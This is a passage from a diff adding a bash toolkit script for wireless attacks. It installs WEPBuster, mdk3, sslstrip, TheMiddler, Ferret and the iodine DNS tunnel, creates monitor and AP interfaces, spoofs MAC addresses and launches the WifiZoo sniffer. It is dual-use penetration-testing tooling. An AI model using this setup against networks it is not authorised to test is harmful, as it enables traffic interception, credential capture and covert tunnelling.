+	#echo '// while(!ret) ret = scanf( "%s", tmpbuf );'
+	#echo -e "     ...."
+	#echo '// if( tmpbuf[0] == 'y' || tmpbuf[0] == 'Y' )	'
+	#echo -e 'Now change "round > 10" to "round > 2"    Check below:'
+	#echo -e 'PCT; printf("No answer, repeating...\n");'
+	#echo -e "     ...."
+	#echo -e "     ...."
+	#echo -e 'if (round > 10)'
+	#echo -e ""$MAGENTA"Press <CR> after you are done."$END""
+	#read blah
+	echo -e ""$CYAN"Starting compilation"$END""
+	
+	make sqlite=true unstable=true
+	make sqlite=true unstable=true install 
+	echo "Updating OUI file"
+	airodump-ng-oui-update
+	echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+        read blah
+
+        ;;
+
+	9)
+        echo -e ""$RED"Installing WEPBuster"$END""
+	svn checkout http://wepbuster.googlecode.com/svn/trunk/ `echo $WEPBUSTER | sed -e 's/wepbuster//g'` 
+	chmod 700 $WEPBUSTER 
+	#echo -e "You need small changes to your Aircrack installation."
+	#echo -e "I'm using the precompiled aircrack binaries from wepbuster"
+	#echo -e "They will be stored in $aircrackwepbuster"
+        PWD=`pwd`
+	echo Installing IO-Tty Perl Module
+	wget http://search.cpan.org/CPAN/authors/id/R/RG/RGIERSIG/IO-Tty-1.07.tar.gz
+	tar xfvz IO-Tty-1.07.tar.gz
+	cd IO-Tty-1.07
+	perl ./Makefile.PL; make; make install
+	cd ..
+	 echo Installing Expect Perl Module
+	 wget http://search.cpan.org/CPAN/authors/id/R/RG/RGIERSIG/Expect-1.21.tar.gz
+	 tar xfvz Expect-1.21.tar.gz
+	 cd Expect-1.21/ 
+	 perl ./Makefile.PL ; make ;make install
+	#mkdir $aircrackwepbuster
+	#cd `which aircrack-ng | sed -e 's/\/aircrack-ng//g'`
+	#wget http://wepbuster.googlecode.com/files/aircrack-ng-1.0rc3_wepbuster.tgz
+	#tar xfzv ./aircrack-ng-1.0rc3_wepbuster.tgz
+	#chmod 700 ./* 
+	cd $PWD
+	echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+        read blah
+        ;;
+	10)
+	echo -e ""$RED"Installing Iodine DNS Tunnel"$END""
+	PWD=`pwd`
+	cd $TMP
+	wget http://code.kryo.se/iodine/iodine-0.6.0-rc1.tar.gz
+	tar xfvz iodine-0.6.0-rc1.tar.gz
+	cd iodine-0.6.0-rc1
+	make
+	cp bin/iodine $IODINE 
+	cp bin/iodined $IODINED
+	cd $PWD
+	echo "The latest svn snapshot can be installed with:"
+	echo "svn co http://svn.kryo.se/iodine iodine"
+	echo "make"
+	echo "cp bin/iodine $IODINE"
+	echo "cp bin/iodined $IODINED"
+	echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+        read blah
+	;;
+	11)
+	echo -e ""$RED"Installing mdk3 Wifi bruteforcer"$END""
+        PWD=`pwd`
+        cd $TMP
+        wget http://homepages.tu-darmstadt.de/~p_larbig/wlan/mdk3-v5.tar.bz2
+	tar xjf mdk3-v5.tar.bz2
+        #bunzip2 mdk3-v5.tar.bz2
+	#tar xfv mdk3-v5.tar
+	cd mdk3-v5
+	vi mdk3-v5-gcc-4.3.diff
+	patch -p1 < mdk3-v5-gcc-4.3.diff
+	make
+	make install
+	;;
+	12)
+	  echo -e ""$RED"Installing sslstrip"$END""
+          PWD=`pwd`
+          cd $TMP
+          wget http://www.thoughtcrime.org/software/sslstrip/sslstrip-0.7.tar.gz
+	  tar xfvz ./sslstrip-0.7.tar.gz
+	  cd sslstrip-0.7
+	  python ./setup.py install 
+	  echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+          read blah
+	;;
+	13)
+          echo -e ""$RED"Installing Skype"$END""
+	  PWD=`pwd`
+	  cd $TMP
+	  wget http://www.skype.com/go/getskype-linux-static -O skype.tar.bz2
+	  tar xfvj skype.tar.bz2
+	  cd $PWD
+	  echo "Skype is available in $TMP/skype_static..."
+	  echo "Consider copying it manually to a more suitable location."
+	  echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+          read blah
+        ;;	  	
+	14)
+          echo -e ""$RED"Installing tcpxtract"$END""
+	  PWD=`pwd`
+	  cd $TMP
+	  apt-get install flex
+	  wget http://prdownloads.sourceforge.net/tcpxtract/tcpxtract-1.0.1.tar.gz?download
+	  tar xfvz tcpxtract-1.0.1.tar.gz
+	  cd tcpxtract-1.0.1
+	  ./configure
+	  make
+	  make install
+	  cd $PWD
+	  echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+          read blah
+	;;
+        15)
+          echo -e ""$RED"Installing TheMiddler"$END""
+          PWD=`pwd`
+          cd $TMP
+	  #old version: wget http://www.inguardians.com/tools/middler-1.0.tgz
+          #tar xfvz middler-1.0.tgz
+          aptitude install libdumbnet-dev python-libpcap python-beautifulsoup python-scapy
+	  svn co https://svn.bolloretelecom.eu/opensource/python-netfilter/trunk/ python-netfilter
+	  cd python-netfilter
+	  python2.6 setup.py install
+          cd ..
+	  svn checkout http://middler.googlecode.com/svn/trunk/ TheMiddler 
+          cd TheMiddler
+	  python2.6 setup.py install
+	  cp -r TheMiddler/libmiddler/* /usr/local/python/2.6.3/lib/python2.6/site-packages/libmiddler/
+          cd $PWD
+          echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+          read blah
+        ;;
+        16)
+          echo -e ""$RED"Installing Python2.6, Scapy and Netfilter" 
+          echo -e "Python2.6 will be installed additionally to other Python installations"$END""
+          PWD=`pwd`
+          cd $TMP
+	  aptitude install build-essential libncursesw5-dev libreadline5-dev libssl-dev libgdbm-dev libbz2-dev libc6-dev libsqlite3-dev libdb-dev tk-dev
+	  wget http://python.org/ftp/python/2.6.3/Python-2.6.3.tgz
+	  tar xfvz Python-2.6.3.tgz
+	  cd Python-*
+	  ./configure --prefix=/usr/local/python/2.6.3
+	  make
+	  make install
+	  ln -s /usr/local/python/2.6.3/bin/python /usr/bin/python2.6
+	  cd ..
+	  wget http://www.secdev.org/projects/scapy/files/scapy-latest.zip
+ 	  unzip scapy-latest.zip
+	  cd scapy-*
+	  python2.6 ./setup.py install
+	  cd ..
+	  aptitude install libdumbnet-dev python-libpcap python-beautifulsoup python-scapy
+	  svn co https://svn.bolloretelecom.eu/opensource/python-netfilter/trunk python-netfilter
+	  cd python-netfilter
+	  python2.6 setup.py install
+
+          cd $PWD
+          echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+          read blah
+        ;;
+	17)
+	  echo -e ""$RED"Installing Ferret 1.1"$END""
+          PWD=`pwd`
+          cd $TMP
+	  wget http://www.erratasec.com/Ferret-1_1.zip
+	  unzip Ferret-1_1.zip
+	  chmod 770 Ferret/bin/ferret
+	  cp Ferret/bin/ferret /usr/bin/
+          cd $PWD
+          echo -e ""$GREEN"Installation done. Check output above and press <CR>"$END""
+          read blah
+	;;
+
+	99) 
+	return 0
+	;;
+   	esac
+#fi
+return 0
+}
+
+
+
+
+######## Destroy all wireless interfaces  ########
+cleanup_system()
+# Parameters: wifi device name e.g. wifi0, wlan0
+{
+if [ x"$1" = "x" ]; then echo -e ""$RED"Missing interface name. Nothing to do!"$END""; return 1; fi #missing Parameter
+   echo "Cleaning up interface $wifi"
+   #Which wireless chipset do we have....
+   get_wifi_driver $1
+
+   if [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ] ;then
+      if [ $DEBUG = "ON" ]; then echo -e "DEBUG: Entering ath5 / 9k section"   ; fi
+      echo -e "Destroying all available $wifichip monitor devices"
+      find /proc/sys/net -name 'mon?' | sed -e 's/.*mon/mon/g' | sort | uniq | xargs -i $airmon stop {} >> $LOGFILE 2>&1 &
+      echo Bringing down interface $newint
+      ifconfig $newint down >> $LOGFILE 2>&1 &
+
+   elif [ $wifidriver = "ath_pci" ];then
+      echo -e "Destroying all available $wifichip VAPs."
+      find /proc/sys/net -name 'ath?' | sed -e 's/.*ath/ath/g' | sort | uniq | xargs -i $wlanconfig {} destroy >> $LOGFILE 2>&1 & 
+
+   elif [ `echo $wifidriver | grep -q rt; echo $?` -eq 0 ]; then
+      if [ $DEBUG = "ON" ]; then echo "DEBUG: In ralink station interface creation"; fi
+
+
+      echo -e "Destroying all available $wifichip monitor devices"
+      find /proc/sys/net -name 'mon?' | sed -e 's/.*mon/mon/g' | sort | uniq | xargs -i $airmon stop {} >> $LOGFILE 2>&1 &
+      echo Bringing down interface $newint
+      ifconfig $newint down >> $LOGFILE 2>&1 &
+      #with different driver this would be rausb0
+
+   else
+     echo  -e "Interface $1 not supported for cleanup"
+     newint=""
+     return 1
+   fi
+	
+}
+
+
+######## Choosing wireless interface ########
+pick_wireless_interface()
+{
+# Sets some global variables:  $newint $wifidriver $wifichipset
+
+echo -e ""$CYAN"Parsing wireless devices..."$END""
+find /proc/sys/net -name 'wifi?' | sed -e 's/.*wifi/wifi/g' | sort | uniq > $TMP/wifiinterfaces
+find /proc/sys/net -name 'wlan?' | sed -e 's/.*wlan/wlan/g' | sort | uniq >> $TMP/wifiinterfaces
+find /proc/sys/net -name 'rausb?' | sed -e 's/.*rausb/rausb/g' | sort | uniq >> $TMP/wifiinterfaces
+i=0
+while read line; do
+  i=`expr $i + 1`
+  #old method to figure the wifi chipset
+  #echo -e ""$BLUE"$i) $line"$END" `$airmon | grep -v parent |grep $line | awk '{print $2}'`"
+  get_wifi_driver $line
+  echo -e ""$BLUE"$i) $line"$END" Chipset: $wifichip, Driver: $wifidriver, Bus: $bus "
+ done < $TMP/wifiinterfaces
+if [ `cat $TMP/wifiinterfaces | wc -l` -gt 0 ]; then
+  echo -en ""$MAGENTA"Select a wireless interface: "$END""
+  read wint
+  if [ x$wint != x ]; then
+    while [ $wint -gt `cat $TMP/wifiinterfaces | wc -l` ]; do
+      echo -e ""$RED"Interface not found! Try again:"$END""
+      read wint
+    done
+    i=0
+    while read line; do
+      i=`expr $i + 1`
+      if [ $i -eq $wint ]; then echo $line has been set as wireless interface ; wifi=$line; newint=$wifi; fi
+    done < $TMP/wifiinterfaces
+    #echo "Using wireless interface $wifi"
+  fi #User pressed just CR 
+else
+  wifi=NOTFOUND
+  echo -e ""$RED"No wireless interface found. "
+  echo -e "You can't use some of the functionality of this script"$END""
+  echo -en ""$MAGENTA"Press <CR>"$END"" 
+  read blah
+fi
+#running get_driver anyway
+get_wifi_driver $wifi
+}
+
+
+######## Set the wireless driver, especially for Atheros based cards #####
+set_wifi_driver()
+{
+# Parameters:  $1    wireless interface
+
+if [ "$1" = "" ]; then echo -e ""$RED"Missing interface name. Nothing to do!"$END""; return 1; fi #missing Parameter    
+get_wifi_driver $1
+echo -e "Current driver: "$BLUE"$wifidriver"$END""
+if [ $wifidriver = "ath_pci" ]; then
+  echo -en ""$MAGENTA"Do you want to switch to ath5k or ath9k [5/9/n]:"$END""  
+  read blah
+  if [ x$blah = "x5" ]; then
+    echo "Unloading and loading drivers"
+    rmmod ath_pci >> $LOGFILE 2>&1 &
+    modprobe ath5k >> $LOGFILE 2>&1 &
+  elif [ x$blah = "x9" ]; then
+    echo "Unloading and loading drivers"
+    rmmod ath_pci >> $LOGFILE 2>&1 &
+    modprobe ath9k >> $LOGFILE 2>&1 &
+  fi
+elif [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ]; then
+  echo -en ""$MAGENTA"Do you want't to switch to madwifi-ng / ath_pci [Y/n]:"$END""  
+  read blah
+  if [ x$blah = "xY" ]; then
+    echo "Unloading and loading drivers"
+    rmmod ath5k >> $LOGFILE 2>&1 &
+    rmmod ath9k >> $LOGFILE 2>&1 & 
+    modprobe ath_pci  >> $LOGFILE 2>&1 &
+  fi
+else
+  echo -e ""$GREEN"Can't change the driver on interface $1"$END""
+  return
+fi
+  sleep 3
+  echo -e ""$GREEN"Wireless chipset driver has been changed"$END""
+  echo "You need to re-select the wireless interface now"
+  pick_wireless_interface
+  echo -ne ""$MAGENTA"Press <CR>"$END""
+  read blah
+}
+
+
+
+######## Which wireless driver and chipset is in use ########
+get_wifi_driver()
+# Sets some global variables: $wifidriver $wifichipset  
+# Parameters: 
+# $1 interface: [name]
+{
+ wifidriver="NOTFOUND"
+ bus="NOTFOUND"
+ if [ $DEBUG = "ON" ]; then echo "DEBUG: running get_wifi_driver"; fi
+ if [ "$1" = "" ]; then echo -e ""$RED"Missing interface name. Nothing to do!"$END""; return 1; fi #missing Parameter    
+ if [ -e "/sys/class/net/$1/device/driver" ]; then
+    wifidriver="`ls -l "/sys/class/net/$1/device/driver" | sed 's/^.*\/\([a-zA-Z0-9_-]*\)$/\1/'`"
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: In get_wifi_driver:  Got interface $1 found Driver $wifidriver"; fi
+    bus="`ls -l /sys/class/net/$1/device/driver | sed 's/^.*\/\([a-zA-Z0-9_-]*\)\/.*\/.*$/\1/'`"
+    if [ $DEBUG = "ON" ]; then echo "DEBUG: In get_wifi_driver:  Got interface $1 found bus $bus"; fi
+ fi
+ if [ x$(echo $wifidriver | grep ath5k) != "x" ]; then
+     #wifidriver="ath5k"
+     wifichip="Atheros"
+     if [ $DEBUG = "ON" ]; then echo "DEBUG: In get_wifi_driver: Driver $wifidriver wifichip $wifichip"; fi
+ fi
+ if [ x$(echo $wifidriver | grep ath9k) != "x" ]; then
+     #wifidriver="ath9k"
+     wifichip="Atheros"
+     if [ $DEBUG = "ON" ]; then echo "DEBUG: In get_wifi_driver: Driver $wifidriver wifichip $wifichip"; fi
+ fi
+ if [ x$(echo $wifidriver | grep ath_pci) != "x" ]; then
+     #wifidriver="ath_pci"
+     wifichip="Atheros"
+     if [ $DEBUG = "ON" ]; then echo "DEBUG: In get_wifi_driver: Driver $wifidriver wifichip $wifichip"; fi
+ fi
+ if [ x$(echo $wifidriver | grep rt) != "x" ]; then
+     #wifidriver="rtdriver"
+     wifichip="Ralink"
+     if [ $DEBUG = "ON" ]; then echo "DEBUG: In get_wifi_driver: Driver $wifidriver wifichip $wifichip"; fi
+ fi
+ 
+if [ $DEBUG = "ON" ]; then echo "DEBUG: Wireless driver identified: $wifidriver"; fi
+}
+
+
+
+
+######## Creates an wireless interface and/or switches interface mode, sets channel etc.    #######
+create_wireless_interface()
+# Parameters:  
+# $1 interface: [name]
+# $2 mode: [monitor, station, ap]
+# $3 Channel, [RANDOM] for no change or [1-14]  
+# $4 MAC address, RANDOM, if not provided won't be changed (optional)
+# updates the global variable $newint with the created interface name
+# returns 0 if everying went OK, otherwise 1 or greater
+{
+   if [ "$1" = "" ]; then echo -e ""$RED"Missing interface name. Nothing to do!"$END""; return 1; 
+   #missing Parameter
+   elif [ "$2" = "" ]; then echo -e ""$RED"Missing mode. Nothing to do!"$END""; return 1; fi 
+   #missing Parameter
+   if [ x$4 = "x" ]; then
+     if [ $DEBUG = "ON" ]; then echo -e ""$RED"No MAC provided, won't change MAC address!"$END""; fi
+   else
+     if [ $DEBUG = "ON" ]; then echo  "Using MAC address: $4"; fi
+   fi
+	
+   #cleanup_system $wifi
+   newint=""
+   echo  -e "Creating $2 interface using $1"
+   get_wifi_driver $wifi
+   if [ $DEBUG = "ON" ]; then echo "DEBUG: In create_wireless_interface, Wifidriver=$wifidriver Wifichip=$wifichip on channel $3, MAC=$4"; fi
+   case $2 in 
+   ###############################
+   ############################### # station mode is not yet fully supported
+   ##   station interface       ## # e.g. changemac not implemented 
+   ###############################
+   ###############################
+   'station' )
+      if [ "x$3" = "xRANDOM" ]; then  # no channel has been provided
+      ###############################
+      ##  no  channel provided     ##
+      ###############################
+        echo -e "Creating device in $2 mode on no specific channel for $wifidriver interface"
+        ###############################
+        ##      athXk driver         ##
+        ###############################
+	if [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ] ;then
+	  echo -e "No way found yet to create pure station mode interface."
+	  echo -e "Re-loading the driver module works"
+	  #$iwconfig $1 >> $LOGFILE 2>&1
+	  newint=$1
+          ifconfig $newint down
+          if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+	     if [ $wifidriver = "ath5k" ]; then
+                echo  -e ""$RED"Changing MAC with $wifidriver and connecting to an AP might not work!"$END""; fi
+             macchanger -r $newint;
+          elif [ x$4 != "x" ]; then
+	     echo -e ""$CYAN"Setting MAC address: $4"$END""    
+	     if [ $wifidriver = "ath5k" ]; then
+                echo  -e ""$RED"Changing MAC with $wifidriver and connecting to an AP might not work!"$END""; fi
+             macchanger --mac=$4 $newint;
+         else
+             echo -e "Not changing MAC address"
+          fi
+          ifconfig $newint up
+       	  echo -e "Interface $newint has been switched on"
+        ###############################
+        ##     madwifi-ng driver     ##
+        ###############################
+	elif [ $wifidriver = "ath_pci" ]; then
+	  newint=ath0
+	  if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+	     ifconfig $1 down
+             macchanger -r $1;
+	     sleep 2
+	     ifconfig $1 up
+          elif [ x$4 != "x" ]; then
+             echo -e ""$CYAN"Setting MAC address: $4"$END""
+	     ifconfig $1 down
+             macchanger --mac=$4 $1;
+	     sleep 2
+	     ifconfig $1 up 
+         else
+             echo -e "Not changing MAC address"
+          fi
+	  echo -e "Creating $newint VAP from wlandev $1 in $2 mode"
+	  $wlanconfig $newint create wlandev $1 wlanmode sta -bssid >> $LOGFILE 2>&1
+        ###############################
+        ##      ralink driver        ##
+        ###############################
+	elif [ `echo $wifidriver | grep -q rt; echo $?` -eq 0 ]; then
+	  if [ $DEBUG = "ON" ]; then echo "DEBUG: In ralink station interface creation"; fi
+	  $iwconfig $1 >> $LOGFILE 2>&1
+	  newint=$1
+          if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+             macchanger -r $newint;
+          elif [ x$4 != "x" ]; then
+               echo -e ""$CYAN"Setting MAC address: $4"$END""
+               macchanger --mac=$4 $newint;
+	  else
+	       echo -e "Not changing MAC address"
+          fi
+
+	  #newint=`$airmon start $1 | grep "monitor mode enabled" | awk '{print$5}' | sed -e 's/)//g'`
+	else
+	  echo -e ""$RED"Error, no matching driver found"$END""
+	  return 1
+	fi
+      else 
+      ###############################
+      ##      channel provided     ##
+      ###############################
+	echo -e "Creating device in $2 mode on channel $3 for $wifidriver interface"
+        ###############################
+        ##      athXk driver         ##
+        ###############################
+	if [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ] ;then
+	  echo -e "No way found yet to create pure station mode interface."
+	  echo -e "Re-loading the driver module and switching on monitor mode works"
+	  #$iwconfig $1 >> $LOGFILE 2>&1
+	  newint=$1
+          ifconfig $newint down
+          if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+	     if [ $wifidriver = "ath5k" ]; then
+                echo  -e ""$RED"Changing MAC with $wifidriver and connecting to an AP might not work!"$END""; fi
+             macchanger -r $newint
+          elif [ x$4 != "x" ]; then
+	     echo -e ""$CYAN"Setting MAC address: $4"$END""    
+	     if [ $wifidriver = "ath5k" ]; then
+                echo  -e ""$RED"Changing MAC with $wifidriver and connecting to an AP might not work!"$END""; fi
+             macchanger --mac=$4 $newint
+         else
+             echo -e "Not changing MAC address"
+          fi
+	  echo "switching to channel $3"
+	  $iwconfig $newint channel $3
+          ifconfig $newint up
+       	  echo -e "Interface $newint has been switched on"
+        ###############################
+        ##     madwifi-ng driver     ##
+        ###############################
+	elif [ $wifidriver = "ath_pci" ] ;then
+	  #newint=`$airmon start $1 $3 | grep "monitor mode enabled" | awk '{print$1}' | sed -e 's/)//g'`
+	  newint=ath0
+	  if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+	     ifconfig $1 down
+             macchanger -r $1;
+	     sleep 2
+	     ifconfig $1 up 
+          elif [ x$4 != "x" ]; then
+             echo -e ""$CYAN"Setting MAC address: $4"$END""
+	     ifconfig $1 down
+             macchanger --mac=$4 $1;
+	     sleep 2
+	     ifconfig $1 up
+         else
+             echo -e "Not changing MAC address"
+          fi
+	  echo -e "Creating $newint VAP from wlandev $1 in $2 mode"
+	  $wlanconfig $newint create wlandev $1 wlanmode sta -bssid >> $LOGFILE 2>&1
+        ###############################
+        ##      ralink driver        ##
+        ###############################
+	elif [ `echo $wifidriver | grep -q rt; echo $?` -eq 0 ]; then
+	#elif [ $wifidriver = "rt73usb" ] || [ $wifidriver = "rt2800usb" ] ;then
+	  $iwconfig $1 channel $3 >> $LOGFILE 2>&1
+	  newint=$1
+              if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+                 macchanger -r $newint;
+              elif [ x$4 != "x" ]; then
+                   echo -e ""$CYAN"Setting MAC address: $4"$END""
+                   macchanger --mac=$4 $newint;
+	      else
+	           echo -e "Not changing MAC address"
+              fi
+
+	  #newint=`$airmon start $1 $3 | grep "monitor mode enabled" | awk '{print$5}' | sed -e 's/)//g'`
+	else
+	  echo -e ""$RED"Error, no matching driver found"$END""
+	  return 1
+	fi
+
+      fi  #end no / channel
+     ;; #end case station
+   ###############################
+   ###############################
+   ##   monitoring interface    ##
+   ###############################
+   ###############################
+   'monitor' )
+      cleanup_system $1
+      ###############################
+      ##  no  channel provided     ##
+      ###############################
+      if [ "x$3" = "xRANDOM" ]; then  # no channel has been provided
+        echo -e "Creating device in $2 mode on no specific channel"
+        if [ $DEBUG = "ON" ]; then echo "DEBUG: with channel $3"; fi
+        ###############################
+        ##      athXk driver         ##
+        ###############################
+	if [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ] ;then
+	  newint=`$airmon start $1 | grep "monitor mode enabled" | awk '{print$5}' | sed -e 's/)//g'`
+          ifconfig $newint down
+          if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+             macchanger -r $newint;
+          elif [ x$4 != "x" ]; then
+	     echo -e ""$CYAN"Setting MAC address: $4"$END""    
+             macchanger --mac=$4 $newint;
+         else
+             echo -e "Not changing MAC address"
+          fi
+          ifconfig $newint up
+       	  echo -e "Interface $newint has been switched on"
+        ###############################
+        ##     madwifi-ng driver     ##
+        ###############################
+	elif [ $wifidriver = "ath_pci" ] ;then
+	  ifconfig $1 down
+          if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+	     ifconfig $1 down
+             macchanger -r $1;
+	     ifconfig $1 up
+          elif [ x$4 != "x" ]; then
+	     echo -e ""$CYAN"Setting MAC address: $4"$END""    
+	     ifconfig $1 down
+             macchanger --mac=$4 $1;
+	     ifconfig $1 up
+         else
+             echo -e "Not changing MAC address"
+          fi
+	  newint=`$airmon start $1 | grep "monitor mode enabled" | awk '{print$1}' | sed -e 's/)//g'`
+          ifconfig $newint up
+       	  echo -e "Interface $newint has been switched on"
+        ###############################
+        ##      ralink driver        ##
+        ###############################
+
+	elif [ $wifidriver = "rt73usb" ] || [ $wifidriver = "rt2800usb" ] ;then
+	  newint=`$airmon start $1 | grep "monitor mode enabled" | awk '{print$5}' | sed -e 's/)//g'`
+	else
+	  return 1
+	fi
+      ###############################
+      ##      channel provided     ##
+      ###############################
+      else # channel information provided
+	echo -e "Creating device in $2 mode on channel $3 with MAC: $4"
+        if [ $DEBUG = "ON" ]; then echo "DEBUG: with channel $3"; fi
+        ###############################
+        ##     athXk, ralink driver  ##
+        ###############################
+
+	if [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ] || [ `echo $wifidriver | grep -q rt; echo $?` -eq 0 ] ;then
+	   newint=`$airmon start $1 $3 | grep "monitor mode enabled" | awk '{print$5}' | sed -e 's/)//g'`
+           ifconfig $newint down
+           if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+              macchanger -r $newint;
+           elif [ x$4 != "x" ]; then
+	      echo -e ""$CYAN"Setting MAC address: $4"$END""    
+              macchanger --mac=$4 $newint;
+           else
+              echo -e "Not changing MAC address"
+           fi
+           ifconfig $newint up
+       	   echo -e "Interface $newint has been switched on"
+
+        ###############################
+        ##    madwifi-ng driver      ##
+        ###############################
+	elif [ $wifidriver = "ath_pci" ] ;then #madwifi-ng, you need to handle change the MAC on wifi0  
+
+             ifconfig $1 down
+             if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+	        ifconfig $1 down
+                macchanger -r $1;
+	        ifconfig $1 up
+             elif [ x$4 != "x" ]; then
+	        echo -e ""$CYAN"Setting MAC address: $4"$END""    
+	        ifconfig $1 down
+                macchanger --mac=$4 $1;
+	        ifconfig $1 up
+             else
+                echo -e "Not changing MAC address"
+	     fi
+	     newint=`$airmon start $1 $3 | grep "monitor mode enabled" | awk '{print$1}' | sed -e 's/)//g'`
+	fi
+      fi #channel provided or not
+       
+      echo "Created interface (newint): $newint"
+       ifconfig $newint up
+       echo -e "Interface $newint has been switched on"
+   ;; # monitor
+   ###############################
+   ###############################
+   ##  access point interface   ##
+   ###############################
+   ###############################
+   'ap' )
+	echo "Creating monitor interface to determine the next available wifi interface"
+        ###############################
+        ##      athXk driver         ##
+        ###############################
+	if [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ] ;then
+          newint=`$airmon start $1  | grep "monitor mode enabled" | awk '{print$5}' | sed -e 's/)//g'`
+	  $airmon stop $newint >> $LOGFILE 2>&1
+        ###############################
+        ##    madwifi-ng driver      ##
+        ###############################
+        elif [ $wifidriver = "ath_pci" ] ;then
+          newint=`$airmon start $1 | grep "monitor mode enabled" | awk '{print$1}' | sed -e 's/)//g'`
+	  $airmon stop $newint >> $LOGFILE 2>&1
+        ###############################
+        ##      ralink driver        ##
+        ###############################
+        elif [ `echo $wifidriver | grep -q rt; echo $?` -eq 0 ]; then
+        #elif [ $wifidriver = "rt73usb" ] || [ $wifidriver = "rt2800usb" ] ;then
+          newint=`$airmon start $1 | grep "monitor mode enabled" | awk '{print$5}' | sed -e 's/)//g'`
+	  $airmon stop $newint >> $LOGFILE 2>&1
+        else
+          return 1
+        fi
+        if [ $DEBUG = "ON" ]; then echo -e "DEBUG newint: $newint"; fi
+	if [ $DEBUG = "ON" ]; then echo -e "Creating $newint device in $2 mode"; fi
+        ###############################
+        ##      athXk driver         ##
+        ###############################
+	if [ $wifidriver = "ath5k" ] || [ $wifidriver = "ath9k" ] ;then
+           echo -e ""$RED"AP mode not yet supported by $wifidriver driver"$END""
+	   newint=$1
+        ###############################
+        ##   madwifi-ng driver       ##
+        ###############################
+        elif [ $wifidriver = "ath_pci" ]; then
+	  cleanup_system $1
+          ifconfig $1 down
+          if [ "$4" = "RANDOM" ]; then echo -e ""$CYAN"Setting random MAC address"$END""
+	     ifconfig $1 down
+             macchanger -r $1;
+	     ifconfig $1 up
+          elif [ x$4 != "x" ]; then
+             echo -e ""$CYAN"Setting MAC address: $4"$END""
+	     ifconfig $1 down
+             macchanger --mac=$4 $1;
+	     ifconfig $1 up
+         else
+             echo -e "Not changing MAC address"
+          fi
+	  $wlanconfig $newint create wlandev $1 wlanmode ap >> $LOGFILE 2>&1
+	  if [ $DEBUG = "ON" ]; then echo "DEBUG: channel:$3"; fi
+          ###############################
+          ##      channel ???          ##
+          ###############################
+          if [ "x$3" != "xRANDOM" ]; then  # channel has been provided
+	     echo "switching to channel $3"
+	     iwconfig $newint channel $3
+	   fi
+           ifconfig $newint up
+           #echo -e "Interface $newint has been switched on"
+         ###############################
+         ##      ralink driver        ##
+         ###############################
+	 elif [ `echo $wifidriver | grep -q rt; echo $?` -eq 0 ]; then
+	 #elif [ $wifidriver = "rt73usb" ] || [ $wifidriver = "rt2800usb" ]; then
+           echo -e ""$RED"AP mode not yet supported by $wifidriver driver"$END""
+	   newint=$1
+	 fi
+       echo -e "Interface $newint has been switched on"
+    ;;
+    *) 
+	echo -e ""$RED"Wireless mode not supported!"$MAGENTA""
+	newint=""
+	return 1
+     ;;esac
+echo -e ""$GREEN"Interface creation done."$END""
+return 0
+} #function end create_wirless
+
+
+######## Start Wifizoo function ########
+start_wifizoo()
+{
+#required option:  interface name
+if [ -e $WIFIZOO ]; then 
+  echo -e ""$CYAN"Starting Wifizoo listener...."$END""
+  chmod 700 $WIFIZOO
+  PWD=pwd 
+  #mkdir ${LOGFOLDER}wifizoo >> $LOGFILE 2>&1
+  #cd ${LOGFOLDER}wifizoo 
+  #cd `echo $WIFIZOO | sed s/wifizoo.py//`
+  cdinto=`echo $WIFIZOO | sed s/wifizoo.py//`
+  if [ $DEBUG = "ON" ]; then echo "DEBUG: cdinto:$cdinto"; fi
+  cd $cdinto  >> $LOGFILE 2>&1
+  if [ $DEBUG = "ON" ]; then echo "DEBUG: `pwd`"; fi
+  # wifizoo stores its logs in the current directory +logs
+  # But the web GUI looks for its files in the folder wifizoo.py and the rest is located in
+  # We need to start wifizoo in the installation folder and store the logs there
+  #cd ..
+  echo -e ""$MAGENTA"Press <CTRL-A-D> after Wifizoo is started. Press <CR> now."$END""
+  read blah
+  if [ $DEBUG = "ON" ]; then echo "DEBUG: chann=$chann";fi
+  $screen -S wifizoo_$1 $python $WIFIZOO -i $1 
+  cd $PWD
+  echo "Wifizoo's been started in the background"
+  echo "Check out the screens section of the main menu"
+  echo -e "Logs can be found here: "$BLUE"${cdinto}logs/"$END""
+  echo -e "WifiZoo Web GUI Serving HTTP on  "$BLUE"127.0.0.1 port $wifizoo_ui_port "$END""
+  echo -e "WifiZoo HTTP Proxy on  "$BLUE"127.0.0.1 port $wifizoo_proxy_port"$END""
+else 
+  echo -e ""$RED"Can't find $WIFIZOO. Aborting...."$END""
+  echo "You might want to check out: http://community.corest.com/~hochoa/wifizoo/index.html"  
+fi
+  echo -e ""$MAGENTA"Press <CR>"$END""
+  read blah
+
+return
+}
+
+######## Change MAC function ########
+changemac()
+#$1 the wireless interface (mandatory)
+#$2 MAC address , RANDOM for random MAC, or NONE or empty 
+{
